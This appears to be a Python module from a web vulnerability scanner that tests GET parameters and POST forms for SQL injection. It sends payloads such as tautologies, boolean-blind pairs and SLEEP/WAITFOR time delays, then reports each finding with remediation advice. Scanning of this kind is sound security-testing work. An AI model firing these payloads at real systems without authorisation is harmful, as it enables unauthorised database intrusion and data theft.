import re
import urllib.parse
import time
from difflib import SequenceMatcher


def sqli_payloads(base_payloads=None):
    """
    Generate SQL injection payloads including:
    - classic tautologies
    - boolean-based blind
    - time-based (lightweight, optional)
    """
    if base_payloads is None:
        base_payloads = [
            "' OR '1'='1",
            "\" OR \"1\"=\"1",
            "' OR 1=1--",
            "\" OR 1=1--",
            "' OR 'a'='a",
            "' OR ''='",
        ]

    out = list(base_payloads)

    blind_payloads = [
        "' AND '1'='1",
        "' AND '1'='2",
        "\" AND \"1\"=\"1",
        "\" AND \"1\"=\"2",
        "' OR 1=1#",
        "' OR 1=2#",
    ]
    out.extend(blind_payloads)

    time_payloads = [
        "' OR SLEEP(2)--",
        "\" OR SLEEP(2)--",
        "'; WAITFOR DELAY '0:0:2'--",
    ]
    out.extend(time_payloads)

    seen = set()
    res = []
    for p in out:
        if p not in seen:
            seen.add(p)
            res.append(p)
    return res


class SQLiCheck:
    """SQL Injection vulnerability checker."""

    SQLI_PAYLOADS = sqli_payloads()

    ERROR_PATTERNS = [
        re.compile(r"you have an error in your sql syntax", re.I),
        re.compile(r"warning.*mysql", re.I),
        re.compile(r"unclosed quotation mark after the character string", re.I),
        re.compile(r"quoted string not properly terminated", re.I),
        re.compile(r"syntax error.*sql", re.I),
        re.compile(r"mysql_fetch", re.I),
        re.compile(r"ORA-\d+", re.I),
        re.compile(r"SQLITE_ERROR", re.I),
    ]

    @classmethod
    def run(cls, http, params_map):
        """Test GET parameters for SQLi vulnerabilities."""
        findings = []

        for url, param_names in params_map.items():
            for param in param_names:
                findings.extend(cls._test_parameter(http, url, param))

        return findings

    @classmethod
    def run_forms(cls, http, forms):
        """Test POST forms for SQLi vulnerabilities."""
        findings = []

        for form in forms:
            if form["method"].upper() == "POST":
                findings.extend(cls._test_form(http, form))

        return findings

    @classmethod
    def _test_parameter(cls, http, url, param_name):
        """Test a specific GET parameter for SQLi."""
        findings = []

        # First, try error-based and time-based detection
        for payload in cls.SQLI_PAYLOADS:
            try:
                parsed = urllib.parse.urlparse(url)
                query_params = urllib.parse.parse_qs(parsed.query)

                query_params[param_name] = [payload]
                new_query = urllib.parse.urlencode(query_params, doseq=True)

                test_url = urllib.parse.urlunparse((
                    parsed.scheme, parsed.netloc, parsed.path,
                    parsed.params, new_query, parsed.fragment
                ))

                start = time.time()
                response = http.get(test_url)
                elapsed = time.time() - start

                if cls._is_vulnerable(response, elapsed):
                    findings.append({
                        "type": "SQL Injection (GET)",
                        "severity": "CRITICAL",
                        "severity_score": 9,
                        "url": test_url,
                        "param": param_name,
                        "payload": payload,
                        "evidence": cls._extract_evidence(response.text),
                        "description": f"SQL Injection vulnerability found in parameter '{param_name}'. "
                                       f"The application directly includes user input in SQL queries.",
                        "recommendation": "Use parameterized queries (prepared statements), input validation, "
                                          "and proper escaping to prevent SQL injection."
                    })
                    break

            except Exception:
                continue

        # If error-based detection failed, try boolean-blind detection
        if not findings:
            findings.extend(cls._test_boolean_blind_get(http, url, param_name))

        return findings

    @classmethod
    def _test_form(cls, http, form):
        """Test a POST form for SQLi vulnerabilities (FIXED, minimal change)."""
        findings = []

        for input_field in form["inputs"]:
            if input_field["hidden"]:
                continue

            param_name = input_field["name"]
            param_findings = []

            # ✅ FIX 1: stable baseline values
            base_data = {}
            for inp in form["inputs"]:
                if inp["value"]:
                    base_data[inp["name"]] = inp["value"]
                else:
                    base_data[inp["name"]] = "1"  # <-- important fix

            for payload in cls.SQLI_PAYLOADS:
                try:
                    data = base_data.copy()
                    data[param_name] = payload

                    start = time.time()
                    response = http.post(form["action"], data=data)
                    elapsed = time.time() - start

                    # ✅ FIX 2: ignore bad responses
                    if not response or response.status_code >= 400:
                        continue

                    if cls._is_vulnerable(response, elapsed):
                        param_findings.append({
                            "type": "SQL Injection (POST)",
                            "severity": "CRITICAL",
                            "severity_score": 9,
                            "url": form["action"],
                            "form_page": form["page"],
                            "param": param_name,
                            "payload": payload,
                            "evidence": cls._extract_evidence(response.text),
                            "description": f"SQL Injection vulnerability found in form parameter '{param_name}'.",
                            "recommendation": "Use parameterized queries and input validation."
                        })
                        break

                except Exception:
                    continue

            # ✅ FIX 3: boolean blind PER PARAM (this is the key fix)
            if not param_findings:
                param_findings.extend(
                    cls._test_boolean_blind_post(http, form, param_name)
                )

            findings.extend(param_findings)

        return findings

    @classmethod
    def _test_boolean_blind_get(cls, http, url, param_name):
        """Test GET parameter for boolean-based blind SQLi by comparing responses."""
        findings = []

        try:
            # Get baseline response with SAFE value first
            parsed = urllib.parse.urlparse(url)
            query_params = urllib.parse.parse_qs(parsed.query)

            # Use original parameter value as baseline (safe value)
            baseline_value = query_params.get(param_name, ['1'])[0] if param_name in query_params else '1'
            query_params[param_name] = [baseline_value]
            baseline_query = urllib.parse.urlencode(query_params, doseq=True)
            baseline_url = urllib.parse.urlunparse((
                parsed.scheme, parsed.netloc, parsed.path,
                parsed.params, baseline_query, parsed.fragment
            ))

            baseline_response = http.get(baseline_url)
            baseline_text = baseline_response.text if baseline_response else ""
            baseline_status = baseline_response.status_code if baseline_response else 0
            baseline_len = len(baseline_text)

            if baseline_len == 0:
                return findings

            # Test with TRUE condition: ' AND '1'='1
            true_payload = "' AND '1'='1"
            query_params[param_name] = [true_payload]
            new_query = urllib.parse.urlencode(query_params, doseq=True)
            true_url = urllib.parse.urlunparse((
                parsed.scheme, parsed.netloc, parsed.path,
                parsed.params, new_query, parsed.fragment
            ))
            true_response = http.get(true_url)
            true_text = true_response.text if true_response else ""
            true_status = true_response.status_code if true_response else 0
            true_len = len(true_text)

            # Test with FALSE condition: ' AND '1'='2
            false_payload = "' AND '1'='2"
            query_params[param_name] = [false_payload]
            new_query = urllib.parse.urlencode(query_params, doseq=True)
            false_url = urllib.parse.urlunparse((
                parsed.scheme, parsed.netloc, parsed.path,
                parsed.params, new_query, parsed.fragment
            ))
            false_response = http.get(false_url)
            false_text = false_response.text if false_response else ""
            false_status = false_response.status_code if false_response else 0
            false_len = len(false_text)

            # Compare responses - now includes status code check
            # TRUE should match baseline, FALSE should differ from baseline
            true_matches_baseline = not cls._compare_responses(baseline_text, true_text, baseline_status, true_status)
            false_differs_baseline = cls._compare_responses(baseline_text, false_text, baseline_status, false_status)
            if true_matches_baseline and false_differs_baseline:
                findings.append({
                    "type": "SQL Injection (GET - Boolean Blind)",
                    "severity": "CRITICAL",
                    "severity_score": 9,
                    "url": true_url,
                    "param": param_name,
                    "payload": true_payload,
                    "evidence": f"Boolean-based blind SQLi detected: TRUE condition (status {true_status}, {true_len} bytes) vs FALSE condition (status {false_status}, {false_len} bytes)",
                    "description": f"Boolean-based blind SQL Injection vulnerability found in parameter '{param_name}'. "
                                   f"The application behaves differently based on SQL boolean conditions, revealing information.",
                    "recommendation": "Use parameterized queries (prepared statements), input validation, "
                                      "and proper escaping to prevent SQL injection."
                })

        except Exception:
            pass

        return findings

    @classmethod
    def _test_boolean_blind_post(cls, http, form, param_name):
        """Test POST parameter for boolean-based blind SQLi by comparing responses."""
        findings = []

        try:
            # Get baseline response
            baseline_data = {}
            baseline_value = None
            for inp in form["inputs"]:
                baseline_data[inp["name"]] = inp["value"]
                if inp["name"] == param_name:
                    baseline_value = inp["value"]

            baseline_response = http.post(form["action"], data=baseline_data)
            baseline_text = baseline_response.text if baseline_response else ""
            baseline_status = baseline_response.status_code if baseline_response else 0
            baseline_len = len(baseline_text)

            if baseline_len == 0:
                return findings

            # Test with TRUE condition
            true_data = {}
            for inp in form["inputs"]:
                if inp["name"] == param_name:
                    true_data[inp["name"]] = "' AND '1'='1"
                else:
                    true_data[inp["name"]] = inp["value"]

            true_response = http.post(form["action"], data=true_data)
            true_text = true_response.text if true_response else ""
            true_status = true_response.status_code if true_response else 0
            true_len = len(true_text)

            # Test with FALSE condition
            false_data = {}
            for inp in form["inputs"]:
                if inp["name"] == param_name:
                    false_data[inp["name"]] = "' AND '1'='2"
                else:
                    false_data[inp["name"]] = inp["value"]

            false_response = http.post(form["action"], data=false_data)
            false_text = false_response.text if false_response else ""
            false_status = false_response.status_code if false_response else 0
            false_len = len(false_text)

            # Compare responses - now includes status code check
            true_matches_baseline = not cls._compare_responses(baseline_text, true_text, baseline_status, true_status)
            false_differs_baseline = cls._compare_responses(baseline_text, false_text, baseline_status, false_status)
            if true_matches_baseline and false_differs_baseline:
                findings.append({
                    "type": "SQL Injection (POST - Boolean Blind)",
                    "severity": "CRITICAL",
                    "severity_score": 9,
                    "url": form["action"],
                    "form_page": form["page"],
                    "param": param_name,
                    "payload": "' AND '1'='1",
                    "evidence": f"Boolean-based blind SQLi detected: TRUE condition (status {true_status}, {true_len} bytes) vs FALSE condition (status {false_status}, {false_len} bytes)",
                    "description": f"Boolean-based blind SQL Injection vulnerability found in form parameter '{param_name}'. "
                                   f"The application behaves differently based on SQL boolean conditions, revealing information.",
                    "recommendation": "Use parameterized queries (prepared statements), input validation, "
                                      "and proper escaping to prevent SQL injection."
                })

        except Exception:
            pass

        return findings

    @classmethod
    def _compare_responses(cls, response1, response2, status1=200, status2=200):
        """
        Compare two responses to detect if they are significantly different.
        Uses multiple comparison methods for robustness.
        Includes HTTP status code comparison.
        """
        if not response1 or not response2:
            return False

        # Method 0: Status code comparison (most reliable indicator)
        if status1 != status2:
            # Different status codes = likely vulnerable
            return True

        # Method 1: Length comparison (must differ by at least 5% or 100 bytes)
        len1 = len(response1)
        len2 = len(response2)
        len_diff = abs(len1 - len2)
        len_ratio = len_diff / max(len1, len2) if max(len1, len2) > 0 else 0

        if len_diff > 100 or len_ratio > 0.05:
            return True

        # Method 2: Content similarity using SequenceMatcher (must differ by at least 15%)
        similarity = SequenceMatcher(None, response1, response2).ratio()
        if similarity < 0.85:
            return True

        return False

    @classmethod
    def _is_vulnerable(cls, response, elapsed=0):
        """Check if response indicates SQLi vulnerability."""
        if not response or not response.text:
            return False

        for pattern in cls.ERROR_PATTERNS:
            if pattern.search(response.text):
                return True

        if elapsed > 1.5:
            return True

        return False

    @classmethod
    def _extract_evidence(cls, response_text):
        """Extract relevant evidence from response."""
        if not response_text:
            return "No response text"

        for pattern in cls.ERROR_PATTERNS:
            match = pattern.search(response_text)
            if match:
                start = max(0, match.start() - 50)
                end = min(len(response_text), match.end() + 50)
                return response_text[start:end].strip()

        lines = response_text.split('\n')
        for line in lines:
            if any(word in line.lower() for word in ["sql", "mysql", "syntax", "error"]):
                return line.strip()[:200]

        return "Potential SQL Injection vulnerability detected"